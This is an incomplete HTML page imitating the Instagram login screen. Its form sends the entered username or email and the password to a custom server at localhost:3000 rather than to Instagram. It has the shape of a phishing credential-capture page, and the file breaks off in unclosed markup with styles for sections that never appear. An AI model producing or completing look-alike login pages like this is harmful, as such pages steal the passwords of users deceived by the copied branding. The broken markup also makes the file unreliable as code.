<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 1200px;
            width: 100%;
            padding: 20px;
        }

        .phones {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .phones img {
            max-height: 500px;
            margin: 0 5px;
        }

        .login-section {
            flex: 1;
            background: #000;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 30px;
            max-width: 350px;
            width: 100%;
            text-align: center;
        }

        .login-section h1 {
            font-family: 'Cursive';
            font-size: 36px;
            text-align: center;
            margin-bottom: 20px;
        }

        .login-section form input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #121212;
            color: #fff;
        }

        .login-section form button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-section .divider {
            margin: 20px 0;
            text-align: center;
            color: #888;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: transparent;
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }

        .facebook-login img {
            width: 20px;
            height: 20px;
            margin-right: 8px;
        }

        .forgot-password {
            margin-top: 15px;
            text-align: center;
            color: #fff;
        }

        .forgot-password a {
            color: #fff;
            text-decoration: none;
        }

        .signup-container {
            margin-top: 20px;
            background-color: #121212;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
        }

        .signup-container a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .app-buttons img {
            max-height: 40px;
            margin: 0 10px;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #888;
        }

        .footer a {
            color: #888;
            text-decoration: none;
            margin: 0 10px;
        }

        .imgupd{
            padding: 20px;
        }

        
    </style>
</head>

        <div class="login-section">
            <h1>Instagram</h1>
            <form action="http://localhost:3000/login" method="POST">
                <input type="text" name="email" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="divider">OR</div>
            <div class="facebook-login">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Icon">

            <div class="forgot-password">
